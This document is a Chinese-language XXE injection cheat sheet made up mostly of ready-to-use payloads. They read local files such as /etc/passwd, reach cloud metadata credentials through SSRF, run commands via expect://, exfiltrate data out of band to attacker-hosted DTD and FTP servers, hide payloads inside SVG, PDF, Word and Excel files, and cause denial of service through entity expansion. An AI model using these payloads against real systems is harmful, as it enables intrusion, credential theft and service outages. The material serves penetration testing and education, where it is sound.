# XXE漏洞

检测漏洞

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

当 XML 解析器解析外部实体时，结果应在 firstName 中包含John，在 lastName 中包含Doe

## 读取文件

1.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck3>
```

2.
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

3.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

4.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

SYSTEM 和 PUBLIC 可以互换，例如：
```xml
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```

在基于Java的应用程序中，可以通过 XXE列出目录的内容，其有效负载如下:
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```

## 执行SSRF攻击

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
 "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

## PHP包装器

### php://filter

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [<!ENTITY xxe SYSTEM
"php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [<!ENTITY xxe SYSTEM
"php://filter为php://filter/convert.base64-encode/resource=http://远程主机地址">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### expect://

```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY cmd SYSTEM "expect://id">
]>
<root>&cmd;</root>
```

## 基于错误的XXE

### 1.本地DTD

DTD列表

[DTD-Finder](https://github.com/GoSecure/dtd-finder/tree/master/list)

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

```XML
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

### 2.远程DTD

malicious.dtd:
```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Payload:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://攻击者主机地址/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

## XXE盲注

### 1.基础盲注

rev.dtd:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///路径/secret.txt">
<!ENTITY % print "<!ENTITY &#37; send SYSTEM 'http://攻击者主机IP地址/landing?text=%file;'>">
```

Payload:
```XML
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "http://攻击者主机地址/rev.dtd">
%dtd;
%print;
%send;
]>
```

### 2.发送内容到主机

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "http://攻击者主机/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### 3.OOB

```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### 4.DTD + PHP://filter + OOB

```XML
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### 5.OOB + Apache Karaf

CVE-2018-11788:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

## 外部文件XXE

### 1.svg

```XML
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

```XML
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

```XML
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

---

```XML
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://攻击者主机/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

xxe.xml:
```XML
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

### 2.PDF

pdf.dtd:
```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Payload:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://攻击者主机地址/pdf.dtd">
%xxe;
]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

### 3.Office Word

+ /word/document.xml
+ /ppt/presentation.xml
+ /xl/workbook.xml

document.xml:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://攻击者主机地址/evil.dtd">
%ext;
]>
<root>&exfil;</root>
```

工具

[OXML_XXE](https://github.com/BuffaloWill/oxml_xxe)

### 4.XLSX

7z l xxe.xlsx

```bash
_rels/.rels
xl/workbook.xml
 xl/styles.xml
xl/worksheets/sheet1.xml
xl/_rels/workbook.xml.rels
xl/sharedStrings.xml
docProps/core.xml
docProps/app.xml
[Content_Types].xml
```

提取 EXCEL 文件
```bash
7z x -oXXE xxe.xlsx
```

Payload添加:

xl/workbook.xml:
```XML
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

或者

xl/sharedStrings.xml:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

xxe.dtd
```XML
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
```

重建EXCEL文件
```bash
cd XXE
7z u ../xxe.xlsx *
```

使用[xxeserv](https://github.com/staaldraad/xxeserv)放置DTD文件并接收FTP请求
```bash
$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

### DTD文件内的XXE

上面详述的大多数 XXE 有效负载都需要控制 DTD 或DOCTYPE块以及xml文件。在极少数情况下，攻击者可能只能控制 DTD 文件而无法修改该xml文件。例如，中间人。当攻击者控制的只是 DTD 文件，并且不控制该xml文件时，使用此有效负载仍然可以进行 XXE:
```XML
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://攻击者主机/x=%payload;">'>
%param1;
%external;
```

## XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 拒绝服务

### 1.十亿笑

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "LOL">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

### 2.YAML

```XML
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### 3.参数笑

```XML
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## 其它攻击

### JAR

jar协议只能在Java 应用程序中访问。它旨在支持PKZIP存档（例如，.zip、.jar等）内的文件访问，同时满足本地和远程文件的需求。

+ jar:file:///var/myarchive.zip!/file.txt
+ jar:https://download.host.com/myarchive.zip!/file.txt

通过 jar 协议访问 PKZIP 存档中的文件的过程涉及几个步骤：

+ 1. 发出 HTTP 请求以从指定位置（例如 .zip）下载 zip 存档https://download.website.com/archive.zip。

+ 2. 包含存档的 HTTP 响应临时存储在系统上，通常存储在诸如/tmp/....

+ 3. 然后提取存档以访问其内容。

+ 4. file.zip读取存档中的特定文件。

+ 5. 操作完成后，在此过程中创建的所有临时文件都将被删除。

在第二步中断此过程的一个有趣的技术是在提供存档文件时无限期地保持服务器连接打开。此存储库中提供的工具可用于此目的，包括 Python 服务器 ( slow_http_server.py) 和 Java 服务器 ( slowserver.jar)。

```XML
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
